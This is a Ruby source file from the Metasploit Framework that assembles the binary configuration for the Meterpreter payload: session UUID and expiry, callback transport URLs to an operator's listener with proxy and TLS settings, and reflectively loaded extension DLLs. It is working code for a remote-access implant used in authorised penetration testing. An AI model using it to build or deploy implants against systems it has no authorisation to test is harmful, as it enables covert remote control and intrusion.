# -*- coding: binary -*-
require 'msf/core/payload/uuid'
require 'msf/core/payload/windows'
require 'msf/core/reflective_dll_loader'
require 'rex/parser/x509_certificate'

class Rex::Payloads::Meterpreter::Config

  include Msf::ReflectiveDLLLoader

  UUID_SIZE = 64
  URL_SIZE = 512
  UA_SIZE = 256
  PROXY_HOST_SIZE = 128
  PROXY_USER_SIZE = 64
  PROXY_PASS_SIZE = 64
  CERT_HASH_SIZE = 20

  def initialize(opts={})
    @opts = opts
    if opts[:ascii_str] && opts[:ascii_str] == true
      @to_str = self.method(:to_ascii)
    else
      @to_str = self.method(:to_wchar_t)
    end
  end

  def to_b
    config_block
  end

private

  def is_x86?
    @opts[:arch] == ARCH_X86
  end

  def to_str(item, size)
    @to_str.call(item, size)
  end

  def to_wchar_t(item, size)
    to_ascii(item, size).unpack("C*").pack("v*")
  end

  def to_ascii(item, size)
    item.to_s.ljust(size, "\x00")
  end

  def session_block(opts)
    uuid = to_str(opts[:uuid].to_raw, UUID_SIZE)
    if opts[:exitfunk]
      exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]
    else
      exit_func = 0
    end

    session_data = [
      0,                  # comms socket, patched in by the stager
      exit_func,          # exit function identifer
      opts[:expiration],  # Session expiry
      uuid                # the UUID
    ]

    session_data.pack("VVVA*")
  end

  def transport_block(opts)
    # Build the URL from the given parameters, and pad it out to the
    # correct size
    lhost = opts[:lhost]
    if lhost && opts[:scheme].start_with?('http') && Rex::Socket.is_ipv6?(lhost)
      lhost = "[#{lhost}]"
    end

    url = "#{opts[:scheme]}://#{lhost}:#{opts[:lport]}"
    url << "#{opts[:uri]}/" if opts[:uri]

    # if the transport URI is for a HTTP payload we need to add a stack
    # of other stuff
    pack = 'A*VVV'
    transport_data = [
      to_str(url, URL_SIZE),     # transport URL
      opts[:comm_timeout],       # communications timeout
      opts[:retry_total],        # retry total time
      opts[:retry_wait]          # retry wait time
    ]

    if url.start_with?('http')
      proxy_host = to_str(opts[:proxy_host] || '', PROXY_HOST_SIZE)
      proxy_user = to_str(opts[:proxy_user] || '', PROXY_USER_SIZE)
      proxy_pass = to_str(opts[:proxy_pass] || '', PROXY_PASS_SIZE)
      ua = to_str(opts[:ua] || '', UA_SIZE)

      cert_hash = "\x00" * CERT_HASH_SIZE
      cert_hash = opts[:ssl_cert_hash] if opts[:ssl_cert_hash]

      # add the HTTP specific stuff
      transport_data << proxy_host  # Proxy host name
      transport_data << proxy_user  # Proxy user name
      transport_data << proxy_pass  # Proxy password
      transport_data << ua          # HTTP user agent
      transport_data << cert_hash   # SSL cert hash for verification

      # update the packing spec
      pack << 'A*A*A*A*A*'
    end

    # return the packed transport information
    transport_data.pack(pack)
  end

  def extension_block(ext_name, file_extension)
    ext_name = ext_name.strip.downcase
    ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{ext_name}",
                                                   file_extension))

    extension_data = [ ext.length, ext ].pack("VA*")
  end

  def config_block

    # start with the session information
    config = session_block(@opts)

    # then load up the transport configurations
    (@opts[:transports] || []).each do |t|
      config << transport_block(t)
    end

    # terminate the transports with NULL (wchar)
    config << "\x00\x00"

    # configure the extensions - this will have to change when posix comes
    # into play.
    file_extension = 'x86.dll'
    file_extension = 'x64.dll' unless is_x86?

    (@opts[:extensions] || []).each do |e|
      config << extension_block(e, file_extension)
    end

    # terminate the extensions with a 0 size
    if is_x86?
      config << [0].pack("V")
    else
      config << [0].pack("Q")
    end

    # and we're done
    config
  end
end
